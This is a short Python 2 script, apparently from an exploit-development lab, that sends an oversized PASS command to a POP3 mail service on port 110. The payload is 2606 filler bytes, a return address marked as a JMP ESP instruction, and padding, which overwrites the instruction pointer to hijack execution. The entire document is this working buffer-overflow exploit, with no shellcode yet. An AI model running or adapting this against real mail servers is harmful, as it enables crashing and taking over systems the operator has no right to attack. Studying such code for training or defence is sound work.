#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
## 5F4A358F   FFE4             JMP ESP
buffer= "A" * 2606 + "\x8f\x35\x4a\x5f"+ "C"*(3500-2606-4)

try:
	print "\nFilling the buffer to crash location"
	s.connect(('192.168.43.34',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nLooks like you Crashed!"
except:
	print "Unable to connect to Mail on port 110"
